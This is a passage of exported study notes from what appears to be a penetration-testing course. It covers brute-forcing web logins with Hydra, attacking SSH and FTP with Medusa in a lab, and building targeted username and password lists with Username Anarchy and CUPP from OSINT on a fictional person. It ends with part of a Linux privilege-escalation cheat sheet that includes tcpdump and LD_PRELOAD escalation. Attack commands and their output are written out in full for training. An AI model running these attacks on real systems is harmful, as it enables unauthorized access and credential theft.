will be targeted.\n    - `Password`: The input field named `password` will be targeted.\n\nWith these details, you can construct the Hydra command to automate the brute-force attack against this login form.\n\n### Browser Developer Tools\n\nAfter inspecting the form, open your browser's Developer Tools (F12) and navigate to the \"Network\" tab. Submit a sample login attempt with any credentials. This will allow you to see the POST request sent to the server. In the \"Network\" tab, find the request corresponding to the form submission and check the form data, headers, and the server’s response.\n\n![Login form with invalid credentials error and network panel showing HTTP POST request details.](https://academy.hackthebox.com/storage/modules/57/devtools.png)\n\nThis information further solidifies the information we will need for Hydra. We now have definitive confirmation of both the target path (`/`) and the parameter names (`username` and `password`).\n\n### Proxy Interception\n\nFor more complex scenarios, intercepting the network traffic with a proxy tool like Burp Suite or OWASP ZAP can be invaluable. Configure your browser to route its traffic through the proxy, then interact with the login form. The proxy will capture the POST request, allowing you to dissect its every component, including the precise login parameters and their values.\n\n## Constructing the params String for Hydra\n\nAfter analyzing the login form's structure and behavior, it's time to build the `params` string, a critical component of Hydra's `http-post-form` attack module. This string encapsulates the data that will be sent to the server with each login attempt, mimicking a legitimate form submission.\n\nThe `params` string consists of key-value pairs, similar to how data is encoded in a POST request. Each pair represents a field in the login form, with its corresponding value.\n\n- `Form Parameters`: These are the essential fields that hold the username and password. Hydra will dynamically replace placeholders (`^USER^` and `^PASS^`) within these parameters with values from your wordlists.\n- `Additional Fields`: If the form includes other hidden fields or tokens (e.g., CSRF tokens), they must also be included in the `params` string. These can have static values or dynamic placeholders if their values change with each request.\n- `Success Condition`: This defines the criteria Hydra will use to identify a successful login. It can be an HTTP status code (like `S=302` for a redirect) or the presence or absence of specific text in the server's response (e.g., `F=Invalid credentials` or `S=Welcome`).\n\nLet's apply this to our scenario. We've discovered:\n\n- The form submits data to the root path (`/`).\n- The username field is named `username`.\n- The password field is named `password`.\n- An error message \"Invalid credentials\" is displayed upon failed login.\n\nTherefore, our `params` string would be:\n\nCode: bash\n\n```bash\n/:username=^USER^&password=^PASS^:F=Invalid credentials\n```\n\n- `\"/\"`: The path where the form is submitted.\n- `username=^USER^&password=^PASS^`: The form parameters with placeholders for Hydra.\n- `F=Invalid credentials`: The failure condition – Hydra will consider a login attempt unsuccessful if it sees this string in the response.\n\nWe will be using [top-usernames-shortlist.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt) for the username list, and [2023-200_most_used_passwords.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt) for the password list.\n\nThis `params` string is incorporated into the Hydra command as follows. Hydra will systematically substitute `^USER^` and `^PASS^` with values from your wordlists, sending POST requests to the target and analyzing the responses for the specified failure condition. If a login attempt doesn't trigger the \"Invalid credentials\" message, Hydra will flag it as a potential success, revealing the valid credentials.\n\nLogin Forms\n\n```shell-session\n# Download wordlists if needed\ndrxh3kr@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt\ndrxh3kr@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt\n# Hydra command\ndrxh3kr@htb[/htb]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form \"/:username=^USER^&password=^PASS^:F=Invalid credentials\"\n\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-05 12:51:14\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task\n[DATA] attacking http-post-form://IP:PORT/:username=^USER^&password=^PASS^:F=Invalid credentials\n[5000][http-post-form] host: IP   login: ...   password: ...\n[STATUS] attack finished for IP (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 12:51:28\n```\n\nRemember that crafting the correct `params` string is crucial for a successful Hydra attack. Accurate information about the form's structure and behavior is essential for constructing this string effectively. Once Hydra has completed the attack, log into the website using the found credentials, and retrieve the flag.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/15-login Bruteforce/10-Medusa",
    "path": "02_CPTS/15-login Bruteforce/10-Medusa.md",
    "title": "10 Medusa",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Medusa --- Medusa, a prominent tool in the cybersecurity arsenal, is designed to be a fast, massively parallel, and modular login brute-forcer. Its primary objective is to support a wide array of serv...",
    "category": "02_CPTS",
    "content": "# Medusa\n\n---\n\nMedusa, a prominent tool in the cybersecurity arsenal, is designed to be a fast, massively parallel, and modular login brute-forcer. Its primary objective is to support a wide array of services that allow remote authentication, enabling penetration testers and security professionals to assess the resilience of login systems against brute-force attacks.\n\n## Installation\n\nMedusa often comes pre-installed on popular penetration testing distributions. You can verify its presence by running:\n\nMedusa\n\n```shell-session\ndrxh3kr@htb[/htb]$ medusa -h\n```\n\nInstalling Medusa on a Linux system is straightforward.\n\nMedusa\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo apt-get -y update\ndrxh3kr@htb[/htb]$ sudo apt-get -y install medusa\n```\n\n## Command Syntax and Parameter Table\n\nMedusa's command-line interface is straightforward. It allows users to specify hosts, users, passwords, and modules with various options to fine-tune the attack process.\n\nMedusa\n\n```shell-session\ndrxh3kr@htb[/htb]$ medusa [target_options] [credential_options] -M module [module_options]\n```\n\n|Parameter|Explanation|Usage Example|\n|---|---|---|\n|`-h HOST` or `-H FILE`|Target options: Specify either a single target hostname or IP address (`-h`) or a file containing a list of targets (`-H`).|`medusa -h 192.168.1.10 ...` or `medusa -H targets.txt ...`|\n|`-u USERNAME` or `-U FILE`|Username options: Provide either a single username (`-u`) or a file containing a list of usernames (`-U`).|`medusa -u admin ...` or `medusa -U usernames.txt ...`|\n|`-p PASSWORD` or `-P FILE`|Password options: Specify either a single password (`-p`) or a file containing a list of passwords (`-P`).|`medusa -p password123 ...` or `medusa -P passwords.txt ...`|\n|`-M MODULE`|Module: Define the specific module to use for the attack (e.g., `ssh`, `ftp`, `http`).|`medusa -M ssh ...`|\n|`-m \"MODULE_OPTION\"`|Module options: Provide additional parameters required by the chosen module, enclosed in quotes.|`medusa -M http -m \"POST /login.php HTTP/1.1\\r\\nContent-Length: 30\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\\r\\nusername=^USER^&password=^PASS^\" ...`|\n|`-t TASKS`|Tasks: Define the number of parallel login attempts to run, potentially speeding up the attack.|`medusa -t 4 ...`|\n|`-f` or `-F`|Fast mode: Stop the attack after the first successful login is found, either on the current host (`-f`) or any host (`-F`).|`medusa -f ...` or `medusa -F ...`|\n|`-n PORT`|Port: Specify a non-default port for the target service.|`medusa -n 2222 ...`|\n|`-v LEVEL`|Verbose output: Display detailed information about the attack's progress. The higher the `LEVEL` (up to 6), the more verbose the output.|`medusa -v 4 ...`|\n\n### Medusa Modules\n\nEach module in Medusa is tailored to interact with specific authentication mechanisms, allowing it to send the appropriate requests and interpret responses for successful attacks. Below is a table of commonly used modules:\n\n| Medusa Module    | Service/Protocol                 | Description                                                                                 | Usage Example                                                                                                               |\n| ---------------- | -------------------------------- | ------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |\n| FTP              | File Transfer Protocol           | Brute-forcing FTP login credentials, used for file transfers over a network.                | `medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |\n| HTTP             | Hypertext Transfer Protocol      | Brute-forcing login forms on web applications over HTTP (GET/POST).                         | `medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^` |\n| IMAP             | Internet Message Access Protocol | Brute-forcing IMAP logins, often used to access email servers.                              | `medusa -M imap -h mail.example.com -U users.txt -P passwords.txt`                                                          |\n| MySQL            | MySQL Database                   | Brute-forcing MySQL database credentials, commonly used for web applications and databases. | `medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt`                                                                 |\n| POP3             | Post Office Protocol 3           | Brute-forcing POP3 logins, typically used to retrieve emails from a mail server.            | `medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt`                                                          |\n| RDP              | Remote Desktop Protocol          | Brute-forcing RDP logins, commonly used for remote desktop access to Windows systems.       | `medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |\n| SSHv2            | Secure Shell (SSH)               | Brute-forcing SSH logins, commonly used for secure remote access.                           | `medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt`                                                                   |\n| Subversion (SVN) | Version Control System           | Brute-forcing Subversion (SVN) repositories for version control.                            | `medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt`                                                                  |\n| Telnet           | Telnet Protocol                  | Brute-forcing Telnet services for remote command execution on older systems.                | `medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt`                                                               |\n| VNC              | Virtual Network Computing        | Brute-forcing VNC login credentials for remote desktop access.                              | `medusa -M vnc -h 192.168.1.100 -P passwords.txt`                                                                           |\n| Web Form         | Brute-forcing Web Login Forms    | Brute-forcing login forms on websites using HTTP POST requests.                             | `medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:\"username=^USER^&password=^PASS^:F=Invalid\"`   |\n\n### Targeting an SSH Server\n\nImagine a scenario where you need to test the security of an SSH server at `192.168.0.100`. You have a list of potential usernames in `usernames.txt` and common passwords in `passwords.txt`. To launch a brute-force attack against the SSH service on this server, use the following Medusa command:\n\nMedusa\n\n```shell-session\ndrxh3kr@htb[/htb]$ medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh \n```\n\nThis command instructs Medusa to:\n\n- Target the host at `192.168.0.100`.\n- Use the usernames from the `usernames.txt` file.\n- Test the passwords listed in the `passwords.txt` file.\n- Employ the `ssh` module for the attack.\n\nMedusa will systematically try each username-password combination against the SSH service to attempt to gain unauthorized access.\n\n### Targeting Multiple Web Servers with Basic HTTP Authentication\n\nSuppose you have a list of web servers that use basic HTTP authentication. These servers' addresses are stored in `web_servers.txt`, and you also have lists of common usernames and passwords in `usernames.txt` and `passwords.txt`, respectively. To test these servers concurrently, execute:\n\nMedusa\n\n```shell-session\ndrxh3kr@htb[/htb]$ medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET \n```\n\nIn this case, Medusa will:\n\n- Iterate through the list of web servers in `web_servers.txt`.\n- Use the usernames and passwords provided.\n- Employ the `http` module with the `GET` method to attempt logins.\n\nBy running multiple threads, Medusa efficiently checks each server for weak credentials.\n\n### Testing for Empty or Default Passwords\n\nIf you want to assess whether any accounts on a specific host (`10.0.0.5`) have empty or default passwords (where the password matches the username), you can use:\n\nMedusa\n\n```shell-session\ndrxh3kr@htb[/htb]$ medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name\n```\n\nThis command instructs Medusa to:\n\n- Target the host at `10.0.0.5`.\n- Use the usernames from `usernames.txt`.\n- Perform additional checks for empty passwords (`-e n`) and passwords matching the username (`-e s`).\n- Use the appropriate service module (replace `service_name` with the correct module name).\n\nMedusa will try each username with an empty password and then with the password matching the username, potentially revealing accounts with weak or default configurations.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/15-login Bruteforce/11-Web Services",
    "path": "02_CPTS/15-login Bruteforce/11-Web Services.md",
    "title": "11 Web Services",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Web Services --- In the dynamic landscape of cybersecurity, maintaining robust authentication mechanisms is paramount. While technologies like Secure Shell (SSH) and File Transfer Protocol (FTP) facil...",
    "category": "02_CPTS",
    "content": "# Web Services\n\n---\n\nIn the dynamic landscape of cybersecurity, maintaining robust authentication mechanisms is paramount. While technologies like Secure Shell (`SSH`) and File Transfer Protocol (`FTP`) facilitate secure remote access and file management, they are often reliant on traditional username-password combinations, presenting potential vulnerabilities exploitable through brute-force attacks. In this module, we will delve into the practical application of `Medusa`, a potent brute-forcing tool, to systematically compromise both SSH and FTP services, thereby illustrating potential attack vectors and emphasizing the importance of fortified authentication practices.\n\n`SSH` is a cryptographic network protocol that provides a secure channel for remote login, command execution, and file transfers over an unsecured network. Its strength lies in its encryption, which makes it significantly more secure than unencrypted protocols like `Telnet`. However, weak or easily guessable passwords can undermine SSH's security, exposing it to brute-force attacks.\n\n`FTP` is a standard network protocol for transferring files between a client and a server on a computer network. It's also widely used for uploading and downloading files from websites. However, standard FTP transmits data, including login credentials, in cleartext, rendering it susceptible to interception and brute-forcing.\n\n## Kick-off\n\n**To follow along, start the target system via the question section at the bottom of the page.**\n\nWe begin our exploration by targeting an SSH server running on a remote system. Assuming prior knowledge of the username `sshuser`, we can leverage Medusa to attempt different password combinations until successful authentication is achieved systematically.\n\nThe following command serves as our starting point:\n\nWeb Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3\n```\n\nLet's break down each component:\n\n- `-h <IP>`: Specifies the target system's IP address.\n- `-n <PORT>`: Defines the port on which the SSH service is listening (typically port 22).\n- `-u sshuser`: Sets the username for the brute-force attack.\n- `-P 2023-200_most_used_passwords.txt`: Points Medusa to a wordlist containing the 200 most commonly used passwords in 2023. The effectiveness of a brute-force attack is often tied to the quality and relevance of the wordlist used.\n- `-M ssh`: Selects the SSH module within Medusa, tailoring the attack specifically for SSH authentication.\n- `-t 3`: Dictates the number of parallel login attempts to execute concurrently. Increasing this number can speed up the attack but may also increase the likelihood of detection or triggering security measures on the target system.\n\nWeb Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3\n\nMedusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>\n...\nACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]\n```\n\nUpon execution, Medusa will display its progress as it cycles through the password combinations. The output will indicate a successful login, revealing the correct password.\n\n## Gaining Access\n\nWith the password in hand, establish an SSH connection using the following command and enter the found password when prompted:\n\nWeb Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ ssh sshuser@<IP> -p PORT\n```\n\nThis command will initiate an interactive SSH session, granting you access to the remote system's command line.\n\n### Expanding the Attack Surface\n\nOnce inside the system, the next step is identifying other potential attack surfaces. Using `netstat` (within the SSH session) to list open ports and listening services, you discover a service running on port 21.\n\nWeb Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ netstat -tulpn | grep LISTEN\n\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -\ntcp6       0      0 :::22                   :::*                    LISTEN      -\ntcp6       0      0 :::21                   :::*                    LISTEN      -\n```\n\nFurther reconnaissance with `nmap` (within the SSH session) confirms this finding as an ftp server.\n\nWeb Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ nmap localhost\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2024-09-05 13:19 UTC\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.000078s latency).\nOther addresses for localhost (not scanned): ::1\nNot shown: 998 closed ports\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n\nNmap done: 1 IP address (1 host up) scanned in 0.05 seconds\n```\n\n### Targeting the FTP Server\n\nHaving identified the FTP server, you can proceed to brute-force its authentication mechanism.\n\nIf we explore the `/home` directory on the target system, we see an `ftpuser` folder, which implies the likelihood of the FTP server username being `ftpuser`. Based on this, we can modify our Medusa command accordingly:\n\nWeb Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5\n\nMedusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>\n\nGENERAL: Parallel Hosts: 1 Parallel Logins: 5\nGENERAL: Total Hosts: 1\nGENERAL: Total Users: 1\nGENERAL: Total Passwords: 197\n...\nACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ... Password: ... [SUCCESS]\n...\nGENERAL: Medusa has finished.\n```\n\nThe key differences here are:\n\n- `-h 127.0.0.1`: Targets the local system, as the FTP server is running locally. Using the IP address tells medusa explicitly to use IPv4.\n- `-u ftpuser`: Specifies the username `ftpuser`.\n- `-M ftp`: Selects the FTP module within Medusa.\n- `-t 5`: Increases the number of parallel login attempts to 5.\n\n### Retrieving The Flag\n\nUpon successfully cracking the FTP password, establish an FTP connection. Within the FTP session, use the `get` command to download the `flag.txt` file, which may contain sensitive information.:\n\nWeb Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost\n\nTrying [::1]:21 ...\nConnected to localhost.\n220 (vsFTPd 3.0.5)\n331 Please specify the password.\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\n200 Switching to Binary mode.\nftp> ls\n229 Entering Extended Passive Mode (|||25926|)\n150 Here comes the directory listing.\n-rw-------    1 1001     1001           35 Sep 05 13:17 flag.txt\n226 Directory send OK.\nftp> get flag.txt\nlocal: flag.txt remote: flag.txt\n229 Entering Extended Passive Mode (|||37251|)\n150 Opening BINARY mode data connection for flag.txt (35 bytes).\n100% |***************************************************************************|    35      776.81 KiB/s    00:00 ETA\n226 Transfer complete.\n35 bytes received in 00:00 (131.45 KiB/s)\nftp> exit\n221 Goodbye.\n```\n\nThen read the file to get the flag:\n\nWeb Services\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat flag.txt\nHTB{...}\n```\n\nThe ease with which such attacks can be executed underscores the importance of employing strong, unique passwords.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/15-login Bruteforce/12-Custom Wordlists",
    "path": "02_CPTS/15-login Bruteforce/12-Custom Wordlists.md",
    "title": "12 Custom Wordlists",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- While pre-made wordlists like rockyou or SecLists provide an extensive repository of potential passwords and usernames, they operate on a broad spectrum, casting a wide net in the hopes of catchin...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nWhile pre-made wordlists like `rockyou` or `SecLists` provide an extensive repository of potential passwords and usernames, they operate on a broad spectrum, casting a wide net in the hopes of catching the right combination. While effective in some scenarios, this approach can be inefficient and time-consuming, especially when targeting specific individuals or organizations with unique password or username patterns.\n\nConsider the scenario where a pentester attempts to compromise the account of \"Thomas Edison\" at his workplace. A generic username list like `xato-net-10-million-usernames-dup.txt` is unlikely to yield any meaningful results. Given the potential username conventions enforced by his company, the probability of his specific username being included in such a massive dataset is minimal. These could range from a straightforward first name/last name format to more intricate combinations like last name/first three.\n\nIn such cases, the power of custom wordlists comes into play. These meticulously crafted lists, tailored to the specific target and their environment, dramatically increase brute-force attacks' efficiency and success rate. They leverage information gathered from various sources, such as social media profiles, company directories, or even leaked data, to create a focused and highly relevant set of potential passwords and usernames. This laser-sharp approach minimizes wasted effort and maximizes the chances of cracking the target account.\n\n## Username Anarchy\n\nEven when dealing with a seemingly simple name like \"Jane Smith,\" manual username generation can quickly become a convoluted endeavor. While the obvious combinations like `jane`, `smith`, `janesmith`, `j.smith`, or `jane.s` may seem adequate, they barely scratch the surface of the potential username landscape.\n\nHuman creativity knows no bounds, and usernames often become a canvas for personal expression. Jane could seamlessly weave in her middle name, birth year, or a cherished hobby, leading to variations like `janemarie`, `smithj87`, or `jane_the_gardener`. The allure of `leetspeak`, where letters are replaced with numbers or symbols, could manifest in usernames like `j4n3`, `5m1th`, or `j@n3_5m1th`. Her passion for a particular book, movie, or band might inspire usernames like `winteriscoming`, `potterheadjane`, or `smith_beatles_fan`.\n\nThis is where `Username Anarchy` shines. It accounts for initials, common substitutions, and more, casting a wider net in your quest to uncover the target's username:\n\nCustom Wordlists\n\n```shell-session\ndrxh3kr@htb[/htb]$ ./username-anarchy -l\n\nPlugin name             Example\n--------------------------------------------------------------------------------\nfirst                   anna\nfirstlast               annakey\nfirst.last              anna.key\nfirstlast[8]            annakey\nfirst[4]last[4]         annakey\nfirstl                  annak\nf.last                  a.key\nflast                   akey\nlfirst                  kanna\nl.first                 k.anna\nlastf                   keya\nlast                    key\nlast.f                  key.a\nlast.first              key.anna\nFLast                   AKey\nfirst1                  anna0,anna1,anna2\nfl                      ak\nfmlast                  abkey\nfirstmiddlelast         annaboomkey\nfml                     abk\nFL                      AK\nFirstLast               AnnaKey\nFirst.Last              Anna.Key\nLast                    Key\n```\n\nFirst, install ruby, and then pull the `Username Anarchy` git to get the script:\n\nCustom Wordlists\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo apt install ruby -y\ndrxh3kr@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git\ndrxh3kr@htb[/htb]$ cd username-anarchy\n```\n\nNext, execute it with the target's first and last names. This will generate possible username combinations.\n\nCustom Wordlists\n\n```shell-session\ndrxh3kr@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt\n```\n\nUpon inspecting `jane_smith_usernames.txt`, you'll encounter a diverse array of usernames, encompassing:\n\n- Basic combinations: `janesmith`, `smithjane`, `jane.smith`, `j.smith`, etc.\n- Initials: `js`, `j.s.`, `s.j.`, etc.\n- etc\n\nThis comprehensive list, tailored to the target's name, is valuable in a brute-force attack.\n\n## CUPP\n\nWith the username aspect addressed, the next formidable hurdle in a brute-force attack is the password. This is where `CUPP` (Common User Passwords Profiler) steps in, a tool designed to create highly personalized password wordlists that leverage the gathered intelligence about your target.\n\nLet's continue our exploration with Jane Smith. We've already employed `Username Anarchy` to generate a list of potential usernames. Now, let's use CUPP to complement this with a targeted password list.\n\nThe efficacy of CUPP hinges on the quality and depth of the information you feed it. It's akin to a detective piecing together a suspect's profile - the more clues you have, the clearer the picture becomes. So, where can one gather this valuable intelligence for a target like Jane Smith?\n\n- `Social Media`: A goldmine of personal details: birthdays, pet names, favorite quotes, travel destinations, significant others, and more. Platforms like Facebook, Twitter, Instagram, and LinkedIn can reveal much information.\n- `Company Websites`: Jane's current or past employers' websites might list her name, position, and even her professional bio, offering insights into her work life.\n- `Public Records`: Depending on jurisdiction and privacy laws, public records might divulge details about Jane's address, family members, property ownership, or even past legal entanglements.\n- `News Articles and Blogs`: Has Jane been featured in any news articles or blog posts? These could shed light on her interests, achievements, or affiliations.\n\nOSINT will be a goldmine of information for CUPP. Provide as much information as possible; CUPP's effectiveness hinges on the depth of your intelligence. For example, let's say you have put together this profile based on Jane Smith's Facebook postings.\n\n|Field|Details|\n|---|---|\n|Name|Jane Smith|\n|Nickname|Janey|\n|Birthdate|December 11, 1990|\n|Relationship Status|In a relationship with Jim|\n|Partner's Name|Jim (Nickname: Jimbo)|\n|Partner's Birthdate|December 12, 1990|\n|Pet|Spot|\n|Company|AHI|\n|Interests|Hackers, Pizza, Golf, Horses|\n|Favorite Colors|Blue|\n\nCUPP will then take your inputs and create a comprehensive list of potential passwords:\n\n- Original and Capitalized: `jane`, `Jane`\n- Reversed Strings: `enaj`, `enaJ`\n- Birthdate Variations: `jane1994`, `smith2708`\n- Concatenations: `janesmith`, `smithjane`\n- Appending Special Characters: `jane!`, `smith@`\n- Appending Numbers: `jane123`, `smith2024`\n- Leetspeak Substitutions: `j4n3`, `5m1th`\n- Combined Mutations: `Jane1994!`, `smith2708@`\n\nThis process results in a highly personalized wordlist, significantly more likely to contain Jane's actual password than any generic, off-the-shelf dictionary could ever hope to achieve. This focused approach dramatically increases the odds of success in our password-cracking endeavors.\n\nIf you're using Pwnbox, CUPP is likely pre-installed. Otherwise, install it using:\n\nCustom Wordlists\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo apt install cupp -y\n```\n\nInvoke CUPP in interactive mode, CUPP will guide you through a series of questions about your target, enter the following as prompted:\n\nCustom Wordlists\n\n```shell-session\ndrxh3kr@htb[/htb]$ cupp -i\n\n___________\n   cupp.py!                 # Common\n      \\                     # User\n       \\   ,__,             # Passwords\n        \\  (oo)____         # Profiler\n           (__)    )\\\n              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]\n                            [ Mebus | https://github.com/Mebus/]\n\n\n[+] Insert the information about the victim to make a dictionary\n[+] If you don't know all the info, just hit enter when asked! ;)\n\n> First Name: Jane\n> Surname: Smith\n> Nickname: Janey\n> Birthdate (DDMMYYYY): 11121990\n\n\n> Partners) name: Jim\n> Partners) nickname: Jimbo\n> Partners) birthdate (DDMMYYYY): 12121990\n\n\n> Child's name:\n> Child's nickname:\n> Child's birthdate (DDMMYYYY):\n\n\n> Pet's name: Spot\n> Company name: AHI\n\n\n> Do you want to add some key words about the victim? Y/[N]: y\n> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: hacker,blue\n> Do you want to add special chars at the end of words? Y/[N]: y\n> Do you want to add some random numbers at the end of words? Y/[N]:y\n> Leet mode? (i.e. leet = 1337) Y/[N]: y\n\n[+] Now making a dictionary...\n[+] Sorting list and removing duplicates...\n[+] Saving dictionary to jane.txt, counting 46790 words.\n[+] Now load your pistolero with jane.txt and shoot! Good luck!\n```\n\nWe now have a generated username.txt list and jane.txt password list, but there is one more thing we need to deal with. CUPP has generated many possible passwords for us, but Jane's company, AHI, has a rather odd password policy.\n\n- Minimum Length: 6 characters\n- Must Include:\n    - At least one uppercase letter\n    - At least one lowercase letter\n    - At least one number\n    - At least two special characters (from the set `!@#$%^&*`)\n\nAs we did earlier, we can use grep to filter that password list to match that policy:\n\nCustom Wordlists\n\n```shell-session\ndrxh3kr@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt\n```\n\nThis command efficiently filters `jane.txt` to match the provided policy, from ~46000 passwords to a possible ~7900. It first ensures a minimum length of 6 characters, then checks for at least one uppercase letter, one lowercase letter, one number, and finally, at least two special characters from the specified set. The filtered results are stored in `jane-filtered.txt`.\n\nUse the two generated lists in Hydra against the target to brute-force the login form. Remember to change the target info for your instance.\n\nCustom Wordlists\n\n```shell-session\ndrxh3kr@htb[/htb]$ hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form \"/:username=^USER^&password=^PASS^:Invalid credentials\"\n\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-05 11:47:14\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 655060 login tries (l:14/p:46790), ~40942 tries per task\n[DATA] attacking http-post-form://IP:PORT/:username=^USER^&password=^PASS^:Invalid credentials\n[PORT][http-post-form] host: IP   login: ...   password: ...\n[STATUS] attack finished for IP (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 11:47:18\n```\n\nOnce Hydra has completed the attack, log into the website using the discovered credentials and retrieve the flag.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/01- Cheet Sheet Linux Privilege Escalation",
    "path": "02_CPTS/16-Linux Privilege Escalation/01- Cheet Sheet Linux Privilege Escalation.md",
    "title": "01  Cheet Sheet Linux Privilege Escalation",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "The cheat sheet is a useful command reference for this module. | Command                                                                         | Description                                       | |...",
    "category": "02_CPTS",
    "content": "The cheat sheet is a useful command reference for this module.\n\n| **Command**                                                                         | **Description**                                       |\n| ----------------------------------------------------------------------------------- | ----------------------------------------------------- |\n| `ssh htb-student@<target IP>`                                                       | SSH to lab target                                     |\n| `ps aux \\| grep root`                                                               | See processes running as root                         |\n| `ps au`                                                                             | See logged in users                                   |\n| `ls /home`                                                                          | View user home directories                            |\n| `ls -l ~/.ssh`                                                                      | Check for SSH keys for current user                   |\n| `history`                                                                           | Check the current user's Bash history                 |\n| `sudo -l`                                                                           | Can the user run anything as another user?            |\n| `ls -la /etc/cron.daily`                                                            | Check for daily Cron jobs                             |\n| `lsblk`                                                                             | Check for unmounted file systems/drives               |\n| `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`                       | Find world-writeable directories                      |\n| `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`                       | Find world-writeable files                            |\n| `uname -a`                                                                          | Check the Kernel versiion                             |\n| `cat /etc/lsb-release`                                                              | Check the OS version                                  |\n| `gcc kernel_expoit.c -o kernel_expoit`                                              | Compile an exploit written in C                       |\n| `screen -v`                                                                         | Check the installed version of `Screen`               |\n| `./pspy64 -pf -i 1000`                                                              | View running processes with `pspy`                    |\n| `find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null`                     | Find binaries with the SUID bit set                   |\n| `find / -user root -perm -6000 -exec ls -ldb {} \\; 2>/dev/null`                     | Find binaries with the SETGID bit set                 |\n| `sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root` | Priv esc with `tcpdump`                               |\n| `echo $PATH`                                                                        | Check the current user's PATH variable contents       |\n| `PATH=.:${PATH}`                                                                    | Add a `.` to the beginning of the current user's PATH |\n| `find / ! -path \"*/proc/*\" -iname \"*config*\" -type f 2>/dev/null`                   | Search for config files                               |\n| `ldd /bin/ls`                                                                       | View the shared objects required by a binary          |\n| `sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart`                            | Escalate privileges using `LD_PRELOAD`                |\n| `readelf -d payroll \\| grep PATH`                                                   | Check the RUNPATH of a binary                         |\n| `gcc src.c -fPIC -shared -o /development/libshared.so`                            